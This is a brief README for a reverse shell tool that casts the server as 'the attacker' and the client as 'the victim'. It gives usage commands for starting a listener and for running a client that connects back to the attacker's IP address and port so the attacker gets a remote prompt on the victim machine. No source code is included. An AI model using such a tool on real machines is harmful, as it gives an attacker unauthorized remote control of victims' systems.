# reverseShell
This is a program in which a 
**server** (or the attacker)
gains a shell of
**client** (or the victim)
to which it is connected to.

## Usage
### 1. Setup a server and listen for incoming connections.
On your machine setup a server and start listening on a port.

``` 
./server 8080 
```

### 2. Execute client script and setup a connection to the server
You can do this by simply executing the client compiled file

```
./client 192.168.0.2 8080
```

Now you should have a prompt on server machine.

